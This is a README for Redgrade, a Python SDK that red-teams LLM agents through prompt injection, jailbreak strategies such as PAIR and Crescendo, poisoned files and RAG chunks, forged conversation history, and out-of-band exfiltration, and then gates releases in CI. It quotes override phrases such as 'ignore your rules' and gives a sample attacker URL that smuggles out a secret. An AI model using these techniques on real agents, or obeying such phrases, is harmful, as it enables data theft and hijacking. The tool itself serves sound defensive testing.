# Redgrade

**Attack your AI agent before you release it.** Redgrade is a Python SDK for AI engineers: point
it at the chat API of the agent you are building, and it attacks it the way an outsider would,
through the prompt, the conversation history, documents and attached files, tool results and
fetched pages. You get back what got through, how to reproduce it, how to fix it, and a release
verdict: **does the agent hold up to the attacker level you require?**

When the agent is solid you release it, and the attacks you found become a deterministic gate
that CI replays on every pull request, so the holes you closed stay closed.

> Status: **0.4 (alpha)**. 162 base attacks across 21 packs (plus 56 derived L4 variants), every
> attack on a five-level ladder from basic to compositional, attacks generated for your agent's
> purpose, seven adaptive attacker strategies (PAIR, TAP, Crescendo, GOAT, Echo Chamber,
> mischievous user, Best-of-N), findings with suggested fixes, a release verdict, and a
> deterministic CI gate. Self-hosted, no SaaS. Built to pair with
> [OpenGrade](https://github.com/19Alma98/ai-eval-platform).

## How you use it

```text
 build the agent ──► redgrade.scan() ──► findings + fixes ──► fix ──► scan again ──► READY
                          │                                                            │
                          └── attacks that got through ──► frozen pack ──► CI: redgrade check
```

1. **Develop.** Your agent has a chat API (any HTTP endpoint, or an OpenAI / Anthropic-compatible
   one). That API is the only contact point Redgrade needs.
2. **Scan.** `scan()` runs every built-in attack, attacks an attacker LLM writes for *your* agent
   (`purpose=`), and adaptive attackers that rewrite what the agent resisted from its own answers.
3. **Fix.** Each finding says which surface was hit (prompt, history, document, attachment,
   tool, fetched page), shows the exact input and output, and suggests a fix. Fix and scan again.
4. **Release** when the scan says `READY` at the level you require.
5. **Keep it in CI.** Freeze what the scan found into a pack and run `redgrade check` on every
   pull request: no attacker model, no provider calls, same verdict for the same output.

The scan is where the vulnerabilities are found; CI only makes sure they do not come back.

## Try it in one minute

The repository ships a vulnerable demo app and a hardened one. The "model" inside is a small
deterministic simulation (no API key, no network), so the numbers are reproducible.

```bash
uv sync
uv run redgrade scan -c examples/redgrade.vulnerable.yaml --no-adaptive   # NOT READY, exit 1
uv run redgrade scan -c examples/redgrade.hardened.yaml --no-adaptive     # NOT READY at L3: one L2 hole
uv run redgrade scan -c examples/redgrade.hardened.yaml --no-adaptive --required-level 1   # READY
```

`--no-adaptive` skips the attacker LLM; drop it once you have one (a local Ollama model by
default, any LiteLLM model with `--attacker-model`).

| | vulnerable app | hardened app |
|---|---|---|
| Release verdict at L3 | **NOT READY** (broken at L1) | **NOT READY** (broken at L2) |
| Overall ASR | 82% | 1% |
| Indirect prompt injection | 64% | 0% |
| Malicious file attachments (incl. text drawn in images) | 96% | 0% |
| Forged conversation history | 100% | 0% |
| Memory poisoning across sessions | 100% | 0% |
| Unsafe output (XSS, SQL, shell, CSV formula, template) | 100% | 0% |
| Phishing / social engineering of the user | 100% | 0% |
| RAG poisoning | 62% | 0% |
| Leaks (prompt, secrets, PII) | 90% | 0% |
| CI gate of the demo config (`redgrade check`) | **FAILED** | passed |

The hardened app is deliberately imperfect: one medium direct-injection attack (multilingual
authority blend, an L2 attack) still gets through. Every L3, L4 and L5 attack is resisted, but the
scan still says *not ready at L3*: resisting the hard attacks never hides a hole in an easy one.
The demo's CI gate passes because its config tolerates a small overall ASR. That is the
difference between the two: the scan tells you what to fix, the gate tells you nothing got worse.

## Scan your agent

```python
from redgrade import ChatTarget, scan

agent = ChatTarget(  # or HttpTarget for any JSON endpoint
    "http://localhost:8000/v1/chat/completions",  # api="anthropic" for /v1/messages
    model="support-agent",
    headers={"Authorization": "Bearer ${APP_TOKEN}"},
)

report = scan(
    agent,
    purpose="support assistant for an online bank; tools: get_balance, transfer, open_ticket",
    required_level=3,  # must hold L1-L3 to be released
    attacker_model="openai/gpt-4o",  # any LiteLLM model; default: local Ollama
    secrets=["a distinctive phrase of your system prompt"],
    oob=True,  # catch agents that call attacker URLs
)

print(report.summary())
ready = report.readiness()
print(ready.verdict)  # READY for release ... / NOT READY for release at L3: broken at L2; ...

for f in report.findings():  # most severe, least sophisticated first
    print(f.id, f.severity, f"L{f.level}", f.surface, f.source, f"{f.successes}/{f.valid}")
    print("  input: ", f.reproduction.prompt or f.reproduction.documents)
    print("  output:", f.reproduction.output)
    print("  fix:   ", f.remediation)

open("scan.md", "w").write(report.to_markdown())  # readiness, findings, fixes, full details
```

Or from the command line, with the same settings in `redgrade.yaml`:

```bash
redgrade init                                  # writes redgrade.yaml
redgrade scan --report scan.md --json scan.json --export-wins found.yaml
```

```yaml
# redgrade.yaml
target:
  type: chat                       # OpenAI- or Anthropic-compatible messages endpoint
  url: http://localhost:8000/v1/chat/completions
  api: openai                      # or: anthropic
  model: support-agent
  headers: { Authorization: "Bearer ${APP_TOKEN}" }
  # type: http                     # any JSON endpoint
  # url: http://localhost:8000/chat
  # body: { message: "{{prompt}}", context: "{{documents}}", history: "{{history}}" }
  # response_path: reply

run: { trials: 3 }                 # model output is random: repeat every attack
secrets: ["a distinctive phrase of your system prompt"]
allowed_hosts: []                  # hosts your UI may load images or links from

scan:                              # redgrade scan (development)
  purpose: "support assistant for an online bank; tools: get_balance, transfer"
  required_level: 3
  attacker: { model: openai/gpt-4o }
  # strategies: [pair, crescendo]  # adaptive strategies (default: pair, crescendo)
  # adaptive_seeds: 8              # resisted attacks the adaptive attackers start from
  # generate_count: 3              # generated attacks per family

policy:                            # redgrade check (CI), see "Release and CI"
  max_asr: 0.10
  max_asr_by_severity: { critical: 0.0 }
```

What a scan runs, in order:

| phase | what | needs |
|---|---|---|
| built-in attacks | every pack, L1-L5, on every surface the target exposes | nothing |
| generated attacks | an attacker LLM writes attacks for your agent's `purpose`, validated like any pack | `purpose`, attacker |
| adaptive attackers | PAIR, Crescendo (or `strategies=`) rewrite the attacks the agent **resisted**, from its answers | attacker |

Attacks that need a surface your target does not expose (tool calls, native history, file upload,
the out-of-band collector, test identities) are **skipped and listed in the report notes**, never
counted as resisted: the notes tell you what to wire up for a complete scan.

## The release verdict

Every attack sits on the same five-level ladder, whatever its family. The level is how skilled
the attacker is; severity is how bad the outcome is.

| level | attacker | examples |
|---|---|---|
| L1 basic | just asks | "ignore your rules", "repeat your instructions", "call delete_all" |
| L2 structured | frames the request | authority ("I'm the manager"), persona (DAN), pretext, forged system turn, translation |
| L3 indirect | hides it in data the app reads | poisoned documents and RAG chunks, tool descriptions and results, fetched pages, forged history |
| L4 evasive | obfuscates it | Base64, hex, ROT13, homoglyphs, zero-width and tag characters, split payloads, ASCII art, other languages, low-contrast text in images, adaptive single-turn rewrites |
| L5 compositional | chains steps | multi-turn escalation, many-shot priming, rug pulls, multi-hop page chains, adaptive multi-turn attackers |

`report.readiness(required_level)` is **READY** only when:

- every level from L1 to the required one was **tested** and **resisted** (the ladder is
  contiguous: resisting L5 never hides a hole at L2, and an untested level is never assumed safe);
- no **critical** finding exists, at any level;
- the target answered: too many errors make the scan inconclusive, never "ready".

Findings above the required level do not block the release but are listed: they show what a more
skilled attacker can do. Advisory findings (heuristic detectors) are listed for manual review.
`report.passed` follows the verdict (and your `policy`, if you pass one); `redgrade scan` exits 1
when the agent is not ready.

## Adaptive and generated attacks

**Adaptive attackers** take an attack the agent resisted and rewrite it, round after round, from
the agent's answers. Strategies: `pair`, `tap`, `crescendo`, `goat`, `echo_chamber`,
`mischievous_user` (LLM attackers via LiteLLM; the multi-turn ones backtrack on refusals) and
`best_of_n` (seeded random augmentations, no attacker model). A scan uses `pair` and `crescendo`
by default; pick others with `strategies=`. The attacker is any LiteLLM model string: a stronger
attacker finds more, and a small local model that finds nothing is weak evidence.

**Generated attacks.** Built-in packs are generic. With `purpose=`, an attacker model writes
attacks for what your agent does (its tools, its data, its users); only families with a
deterministic detector are generated, placeholders (`{CANARY}`, `{VICTIM_ID}`...) are checked and
every attack is validated. The same tools are available on their own:

```bash
redgrade generate --purpose "support bot for an online bank; tools: get_balance, transfer" \
    --family prompt_injection_indirect --family access_control --count 5 --lang zu -o generated.yaml
redgrade translate my_pack.yaml --lang gd --lang hmn          # L4 low-resource-language variants
redgrade import-dataset harmful_behaviors.csv --preset advbench --limit 50 -o advbench.yaml
redgrade deep -c redgrade.deep.yaml                           # adaptive attackers only, on chosen goals
```

Datasets (AdvBench, JailbreakBench, HarmBench, or any CSV/JSONL) are never bundled: download them
yourself. Set `detector: llm_judge` (and `judge:`) when canary/regex cannot score a goal. See
[docs/deep-mode.md](docs/deep-mode.md) for model strings, API keys and YAML examples.

## Attack surfaces

The contact point is the agent's chat API. Redgrade uses every field of it an attacker controls.

For indirect attacks Redgrade passes the poisoned text as `documents`: map it to whatever your
app treats as retrieved or uploaded content. Multi-turn attacks call your target once per turn;
prior user and assistant messages are passed as `history` (`{{history}}` / `{{messages}}` in an
HTTP body, native roles on a `ChatTarget`). If the target does not accept history, Redgrade
prepends formatted prior turns to the current prompt.

### Conversation history

Chat UIs, mobile apps and agent frameworks usually send the **whole conversation** on every call.
If your server trusts it, the attacker writes the history: a fake operator `system` turn, an
`assistant` turn that "already agreed", a `tool` result that carries an instruction, a forged
half-done tool trajectory the agent "completes". The `history_injection` family (9 attacks, L2–L5)
sends those turns through the native fields of your API:

```python
from redgrade import ChatTarget, HttpTarget

# your endpoint takes the conversation as a list of {role, content, ...}
HttpTarget("http://localhost:8000/chat", body={"messages": "{{messages}}"}, response_path="reply")

# your endpoint is OpenAI- or Anthropic-compatible: roles, tool_calls and tool results are native
ChatTarget(
    "http://localhost:8000/v1/chat/completions",  # or .../v1/messages with api="anthropic"
    model="support-agent",
    system_prompt="You are Acme support...",  # only when the endpoint is the bare model
    headers={"Authorization": "Bearer ${APP_TOKEN}"},
)
```

`ChatTarget` also sends the attack's tool catalog as `tools` and reads the tool calls the model
asks for (observed, never executed), so agent and MCP attacks run against it without `tools_path`.
Targets that cannot receive history natively have these attacks **skipped and reported**, never
counted as passed. The fix the demo `hardened` app applies: drop client-sent `system` / `tool`
turns, treat earlier assistant turns as data, or keep the history server-side. Write your own with
`history:` in a pack: see [docs/writing-attacks.md](docs/writing-attacks.md#forged-conversation-history).

### Documents and uploaded files

Most real apps let users attach a PDF, a DOCX or a web page, and the file is where the injection
hides. Redgrade builds real files (standard library only, byte-for-byte reproducible) and uploads
them to your endpoint, hiding the payload where a text extractor will find it but a person will not:

| kind | where the payload can hide (`hide:`) |
|---|---|
| `pdf` | `plain`, `white_text`, `tiny_text` (1pt), `offpage`, `metadata` |
| `docx` | `plain`, `white_text`, `tiny_text`, `vanish`, `comment`, `metadata` |
| `html` | `plain`, `comment`, `display_none`, `white_text`, `meta`, `aria_label` |
| `md` / `csv` / `json` / `txt` | HTML comment, link reference, comment cell, underscore field |
| `png` | `metadata` (text chunk), or drawn in the pixels for OCR / vision: `visible`, `low_contrast` (near-white on white), `tiny` |

Tell the HTTP target how your endpoint receives files:

```python
# multipart/form-data: file in part "file", the rest of `body` becomes form fields
HttpTarget("http://localhost:8000/ask", body={"question": "{{prompt}}"}, upload_field="file")

# or base64 inside a JSON body: [{filename, content_type, data_base64}, ...]
HttpTarget("http://localhost:8000/ask", body={"q": "{{prompt}}", "files": "{{attachments}}"})
```

In `redgrade.yaml` use `upload_field: file` under `target:`. A function target receives
`attachments: list[Attachment]` (with `.data`, `.text`, `.metadata`) if it declares that parameter.
Without an upload surface the 20 `file_attachments` attacks are **skipped and reported**, never
counted as passed. `scan()` runs them whenever the target can receive files, and `check()` adds the `ci.attachments` pipeline automatically when the target can
receive files. Write your own in a pack: see [docs/writing-attacks.md](docs/writing-attacks.md#file-attachments).

### Fetched pages and out-of-band callbacks

An agent that browses, calls APIs or follows links can leak data without saying anything in its
reply: it just loads `https://attacker/x?d=<secret>`. Redgrade runs a small local **attacker web
server** (the out-of-band collector) for those attacks. Per trial it serves poisoned pages, JSON
API responses and multi-hop link chains at a unique URL, and it records every request it gets. The
verdict is a request that **reaches the attacker**, not a string in the output:

```python
from redgrade import HttpTarget, OobServer, scan

report = scan(target, oob=True)  # local collector on 127.0.0.1, random port (check() too)

# the app runs in a container or on another host: bind and advertise a reachable address
with OobServer(host="0.0.0.0", port=8787, public_url="http://host.docker.internal:8787") as oob:
    report = scan(target, oob=oob)
```

```yaml
# redgrade.yaml
oob: { host: 127.0.0.1, port: 0, public_url: null, wait: 1.0 }
```

The `oob_exfiltration` family (6 attacks) covers visible and hidden instructions on fetched
pages, exfiltration of the system prompt through a URL, a two-hop page chain that ends in a POST
of the conversation, instructions inside a JSON API response, and an email that makes the agent
open a link. The report lists the callbacks each successful attack produced (method and path; the
query and body can carry secrets and stay out of the report). Two safety rules:

- without a collector these attacks are **skipped and reported**;
- a trial where the agent **never fetched** the attacker page is an **error** (inconclusive), not
  a pass: the injection never reached the agent.

Try it on the demo browsing agents, which really fetch URLs:

```bash
uv run redgrade scan -c examples/redgrade.browsing.vulnerable.yaml --no-adaptive --family oob_exfiltration   # NOT READY
uv run redgrade check -c examples/redgrade.browsing.hardened.yaml   # gate passes: fetches only user URLs
```

Write your own with `fixtures:` and `{OOB_URL}`: see
[docs/writing-attacks.md](docs/writing-attacks.md#out-of-band-attacks-attacker-pages-and-callbacks).
The collector is plain HTTP on an address you choose; DNS-only callbacks are not covered yet.

### Tools, access control, memory and inter-agent messages

**Broken access control (BOLA / BFLA / RBAC).** The attacker is logged in as one user and tries
to reach another user's objects or an admin-only function *through the agent*. Tell Redgrade who
is who, with real ids from a test tenant:

```yaml
identity:
  user_id: "C-1001"          # the account the target is called as
  victim_id: "C-2002"        # another real user the attacker must never reach
  role: customer
  admin_role: admin
  victim_data: ["giulia.neri@example.com", "ORD-77812"]   # strings only the victim's records contain
```

Attacks reference `{USER_ID}`, `{VICTIM_ID}`, `{USER_ROLE}` and `{ADMIN_ROLE}`; the
`access_violation` detector fires when a tool call carries the victim's id, when the reply contains
`victim_data`, or when an admin-only tool is called. SDK: `scan(..., identity={...})` (same for `check()`).

**Memory poisoning (ASI06).** A turn with `new_session: true` starts a new conversation: no
history is sent and `{{session_id}}` changes. Map it where your app keys conversations (body, URL
or header, or a `session_id` parameter on a function target); long-term memory is usually per
user, so keep the same user. The attack plants an instruction, opens a new session, asks
something unrelated and checks whether the payload came back.

**Inter-agent messages (ASI07)** arrive as spoofed orchestrator results, forged agent cards and
replayed peer messages (`agent_handoff` pack). `check()` adds the `ci.agent` pipeline (agent
hijack, MCP, handoff, access control) when the target exposes its tool calls (`tools_path`).

## What it covers

Redgrade covers attacks that arrive from outside the app. Each attack carries its OWASP category,
and the report shows a coverage matrix so planned families never look "tested".

| family | OWASP | attacks | state |
|---|---|---|---|
| Direct prompt injection | LLM01 | 28 | shipped |
| Indirect prompt injection (documents, web pages, CVs) | LLM01 | 14 | shipped |
| System prompt, secret and PII leakage | LLM02, LLM07 | 7 | shipped |
| Unsafe output handling (markdown/HTML link exfiltration) | LLM05 | 6 | shipped |
| Unbounded consumption | LLM10 | 5 | shipped |
| RAG and vector poisoning | LLM08 | 5 | shipped |
| Multi-turn escalation | LLM01 | 11 | shipped |
| Conversation history injection (forged system / assistant / tool turns) | LLM01 | 9 | shipped (0.5 dev) |
| Malicious file attachments (PDF, DOCX, HTML, CSV, JSON, image metadata and pixels) | LLM01 | 20 | shipped (0.5 dev) |
| Task utility / over-refusal | utility | 7 | shipped |
| Agent goal hijack and tool misuse | LLM06, ASI01 | 8 | shipped |
| Attacker web content and out-of-band exfiltration (agents that fetch URLs) | LLM01, LLM02, ASI01 | 6 | shipped (0.5 dev) |
| MCP: tool poisoning, rug pull, shadowing, confused deputy | LLM06 | 6 | shipped |
| Multi-chain / handoff injection, insecure inter-agent messages | ASI01, ASI07 | 9 | shipped |
| Unsafe output: XSS, javascript links, SQL, shell, CSV formula, template injection | LLM05 | 12 | shipped (dev) |
| Broken access control: BOLA / IDOR, BFLA, RBAC escalation, identity spoofing | LLM06, ASI03 | 11 | shipped (dev) |
| Memory and context poisoning across sessions | ASI06 | 7 | shipped (dev) |
| Human-agent trust exploitation: phishing, vishing, card harvesting, payment redirection | ASI09 | 6 | shipped (dev) |
| Jailbreak and harmful content (opt-in) | LLM01 | 7 | shipped |
| Business integrity / policy abuse (opt-in) | ASI / brand | 5 | shipped |

Write your own attacks as YAML: [docs/writing-attacks.md](docs/writing-attacks.md).

## How a verdict is reached

Detectors are deterministic in CI, so the same output always gives the same verdict:

- **Canary**: every trial injects a random token (`RG-1A2B3C4D`). If the app's output contains it,
  the app obeyed an instruction it should not have.
- **Secrets**: you list strings that must never appear (parts of the system prompt, keys).
- **PII, markdown/HTML exfiltration, output length**: regex and URL checks.
- **Contains / not_contains**: substring checks for grounded answers or missing refusals (`detector_args.patterns`).
- **Tool trajectory** (`tool_called`, `forbidden_tool`, `tool_args_contains`): scores unauthorized or
  poisoned tool use when the target returns `tools_called` (HTTP `tools_path`, or a function that
  returns `TargetObservation`).
- **Unsafe output** (`unsafe_output`): an executable construct (HTML/JS, javascript link, SQL,
  shell, spreadsheet formula, template expression) that carries the trial canary, in the reply or
  in tool arguments. Escaped text and markup inside code blocks do not count.
- **Access violation** (`access_violation`): another user's id in a tool call, another user's
  data in the reply, or an admin-only function called (see `identity:`).
- **Out-of-band callback** (`oob_callback`): the attacker server received a request from the app
  for this trial (optionally a POST, or one carrying a configured secret).
- **Rubric** (`rubric`): regexes that recognize compliance for goals with no canary, usually
  *distilled* during development from LLM-judge verdicts and validated against them (`redgrade distill`).
- **Classifier** (`classifier`): a local model on CPU (refusal, toxicity...), no provider call.
- **Refusal heuristic** (`refusal`): "the app did not refuse". Heuristic verdicts are
  **advisory**: reported, never gated.
- **Your own** (`register_detector`), loaded from `plugins:` or an installed package.

Every detector has a confidence (`evidence` > `rubric` > `heuristic`). Goals only an LLM can judge
are handled without a judge in CI by distilling them during development; a judge can still be passed
explicitly (`check(..., judge=...)`, verdicts cached by output hash); `scan()` uses the attacker model as judge unless you pass `judge_model`. See
[docs/ci-verdicts.md](docs/ci-verdicts.md).

**ASR vs utility:** attack success rate (ASR) is lower-is-better and excludes the `task_utility`
family. Utility probes are benign questions; a high utility rate means the app still answers
normal requests. An app that refuses everything can show ASR 0% and still fail `min_utility`.

Safety rules of the gate: a target that errors out is a **failure**, never a pass; attacks that
need `secrets`, a tools observation surface, native history or the out-of-band collector are
**skipped and reported** when missing; attacks that work only some of the time are marked **flaky**.

## Measure a defense (A/B)

A guardrail is worth what it blocks minus what it breaks. Run the same attacks without and with it:

```bash
redgrade compare -c redgrade.yaml -d redgrade.guarded.yaml --max-utility-drop 0.05
```

```python
from redgrade import GuardedTarget, compare_defense

guarded = GuardedTarget(app, input_guard=lambda req: my_classifier(req.text) > 0.5)
result = compare_defense(app, guarded, families=["prompt_injection_direct", "task_utility"])
print(result.to_markdown())
```

The comparison shows ASR and utility before and after with 95% ranges (and whether the change is
significant with these trials), per family and per level, latency added, the attacks the defense
blocked, those still working, those that work *only* with the defense, and the benign probes it
broke (over-refusal). Exit code 1 when the defense does not lower ASR, introduces a regression, or
costs more utility than allowed.

## Release and CI

### Freeze what the scan found

The scan is not deterministic (it uses an attacker model); CI must be. Turn the scan's results
into packs that CI replays without any provider call:

```bash
redgrade scan --export-wins found.yaml          # adaptive wins, as replayable attacks
redgrade generate --purpose-file purpose.txt -o generated.yaml
redgrade distill judge_goals.yaml -o frozen.yaml # LLM-judge verdicts -> validated regex rubrics
```

```yaml
# redgrade.yaml
packs: [found.yaml, generated.yaml, frozen.yaml]
```

SDK: `report.export_winning_seeds("found.yaml")`. See [docs/ci-verdicts.md](docs/ci-verdicts.md)
for goals that only a judge could score.

### The CI gate: `check()`

`check()` (and `redgrade check`, alias `redgrade run`) replays the deterministic attacks and
applies the `policy:` gate. No attacker model, no provider calls: LiteLLM is never imported.
The optional ``packs`` argument is additive (built-ins plus extra pack paths).

```python
from redgrade import HttpTarget, Policy, check

report = check(
    HttpTarget(
        url="http://localhost:8000/chat",
        body={"message": "{{prompt}}", "context": "{{documents}}"},
        headers={"Authorization": "Bearer ${APP_TOKEN}"},
        response_path="reply",
    ),
    policy=Policy(
        max_asr=0.10,
        max_asr_by_family={"prompt_injection_indirect": 0.0},
        min_security_level=3,
        require_families=["prompt_injection_direct", "prompt_injection_indirect"],
    ),
    trials=3,
    secrets=["a distinctive phrase of your system prompt"],
    extra_packs=["found.yaml"],
)
assert report.passed, report.summary()
```

`check()`, `attack()` and `scan()` accept an `HttpTarget` or a `ChatTarget`. `attack()` is the
escape hatch with explicit `families` / packs. The CLI `redgrade check` still accepts
`type: function` for offline demos.

| `check()` pipeline | families | runs |
|---|---|---|
| `ci.prompt_injection` | direct / indirect PI, multi-turn, history injection, memory poisoning | always |
| `ci.disclosure` | system prompt, secret and PII leakage | always |
| `ci.output` | exfiltration links, unsafe output (XSS, SQL, shell...), user manipulation | always |
| `ci.utility` | benign probes (over-refusal) | always |
| `ci.attachments` | malicious files | when the target accepts files |
| `ci.agent` | goal hijack, MCP, handoff / inter-agent, access control | when the target exposes tool calls |
| `ci.oob` | attacker web content, out-of-band exfiltration | with `oob=True` |

```yaml
policy:
  max_asr: 0.10                              # overall attack success rate (excludes utility)
  max_asr_by_severity: { critical: 0.0 }
  max_asr_by_family: { prompt_injection_indirect: 0.0 }
  min_utility: 1.0                           # benign probes must still be answered
  require_utility: true
  require_families: [prompt_injection_direct, prompt_injection_indirect, task_utility]
  min_security_level: 3                      # hold every tested level up to L3
  # min_family_level: { prompt_injection_indirect: 4 }
  # max_asr_by_level: { 5: 0.1 }             # tolerated ASR per level (default 0)
```

### In your test suite (pytest)

Installing redgrade adds a pytest plugin: every attack becomes its own test, so `-k`, `--lf`,
JUnit and IDE runners work per attack.

```python
# conftest.py
@pytest.fixture(scope="session")
def redgrade_target():
    return HttpTarget("http://localhost:8000/chat", body={"message": "{{prompt}}"})


# test_security.py
from redgrade.pytest_plugin import attacks


@attacks(families=["prompt_injection_direct", "prompt_injection_indirect", "task_utility"])
def test_attack(redgrade, redgrade_attack):
    redgrade.assert_resisted(redgrade_attack)  # utility probes: asserts the app answered


@pytest.mark.redgrade(max_asr=0.2, trials=5)  # per-test tolerance and settings
@attacks(families=["multi_turn"], levels=[5])
def test_long_conversations(redgrade, redgrade_attack):
    redgrade.assert_resisted(redgrade_attack)
```

```bash
pytest --redgrade-trials 3 --redgrade-config redgrade.yaml --redgrade-report redgrade.md
```

A failing test shows the attack, the verdict and an output snippet. A target error fails the test;
a missing surface skips it with the reason. With `--redgrade-config`, the policy is also evaluated
on everything the session ran and a failing gate fails the session (`--redgrade-json`, `--html`,
`--sarif`, `--baseline` too).

### Regressions, scorecard and reports

**Baseline: fail on new successes, not just on a threshold.** Record a baseline once (counts only,
never model output, so it is safe to commit) and compare every pull request against it, attack by
attack:

```bash
redgrade baseline update -c redgrade.yaml        # writes .redgrade/baseline.json
redgrade run -c redgrade.yaml --baseline .redgrade/baseline.json
```

```yaml
policy:
  baseline:
    path: .redgrade/baseline.json
    max_regressions: 0          # attacks that resisted in the baseline and now succeed
    severity_at_least: medium   # ignore regressions below this severity
    fail_on_worsened: false     # significant increase (Wilson intervals) of a failing attack
    fail_on_new: false          # an attack missing from the baseline that succeeds (default: reported only)
    allow:                      # accepted risks, with an expiry
      - { id: PI-D-008, reason: "tracked in SEC-123", until: 2027-01-31 }
```

In the SDK: `check(target, baseline=".redgrade/baseline.json")`, then `report.baseline.regressions`.
Utility probes are tracked too: a benign request that used to be answered and no longer is, is a
regression. Errors are never "improvements".

**Scorecard.** Every report carries a per-family and overall score (0-100), a 95% range and a letter
grade. Attacks are weighted by severity and level; one successful critical attack caps the grade at D
and a high one at C, whatever the average says. With few trials the range is wide and the report says
so. Gate it with `min_security_score` and `min_family_score: {rag_poisoning: 80}`.

**Compliance view.** Every report maps the run to the controls of OWASP Top 10 for LLM (2025),
OWASP Top 10 for Agentic Applications (2026), MITRE ATLAS, NIST AI RMF (MEASURE) and the EU AI Act
(Art. 15, Art. 55): each control is *resisted*, *vulnerable* (with the attacks that broke it),
*not run*, *not covered* or *out of scope*. SARIF rules carry the control ids as tags. Gate it with
`require_compliance: [owasp_llm_2025]` (every control redgrade can test must have run); see the
mapping with `redgrade compliance`; add controls to a single attack with `compliance:` in a pack.
It is test evidence, not a certification.

**Report formats** (static, no provider calls):

| flag | format | use |
|---|---|---|
| `--report` | Markdown | job summary |
| `--json` | JSON (`schema_version: 2`) | machines, baselines |
| `--sarif` | SARIF 2.1.0 | GitHub code scanning (stable per-attack fingerprints, `baselineState`) |
| `--junit` | JUnit XML | GitLab, Jenkins, Azure DevOps |
| `--html` | single self-contained HTML | humans, artifacts |

SARIF, JUnit and HTML leave model output out by default (it can contain secrets or PII); pass
`--include-output` to add snippets. SDK: `report.to_sarif()`, `to_junit()`, `to_html()`, `scorecard()`.
During development, `redgrade.deep.summarize_scorecard(report, model=...)` asks an LLM (LiteLLM) to explain the
scorecard; it never runs in CI.

### In CI

Copy [examples/github-action-gate.yml](examples/github-action-gate.yml) into your repository.
The report goes to the job summary and the job fails when the policy fails. Wire the workflow to
`redgrade check` (or `run`), never to `redgrade scan` or `redgrade deep`: those call an attacker
model and are not reproducible.

### With OpenGrade

OpenGrade compares an experiment with the last accepted run on `main`. Redgrade exports its attacks
as an OpenGrade dataset and provides the metric, so a security regression is flagged like a
quality regression:

```bash
pip install 'redgrade[opengrade]'
redgrade export-dataset attacks.jsonl
```

```python
import opengrade
from redgrade.integrations.opengrade import attack_task, make_metric

og = opengrade.Opengrade(project="support-bot")
og.evaluate(
    dataset="attacks.jsonl",
    task=attack_task(my_app, secrets=["..."], allowed_hosts=["..."]),  # optional for detect_on=any
    metrics=[make_metric(secrets=["..."])],  # 1.0 = attack resisted, 0.0 = attack worked
    baseline="alias:main",
)
```

The metric is tested against the real OpenGrade SDK. It has not yet been run end to end against
a live OpenGrade server (tracked in the roadmap).

## Limits, honestly

- Results are probabilistic. Use enough `trials`; one green run proves little.
- Image attacks draw text with a small built-in bitmap font: enough for OCR and vision models, not
  photorealistic adversarial images. A PDF is only as vulnerable as the extractor your app uses,
  so run these against the real pipeline, not a stub.
- Access-control and memory attacks need a realistic test tenant (real user ids, per-user
  memory); against a stub they prove little.
- The built-in attacks are a starting set, not an exhaustive one. Add your own for your domain.
- Redgrade does not replace a threat model or a human red team.
- The demo app uses a simulated model, so its numbers describe the demo, not any real LLM.

## Development

```bash
uv sync --group dev --extra opengrade
uv run pytest -q
uv run ruff check . && uv run ruff format --check .
```

## License

Apache-2.0.
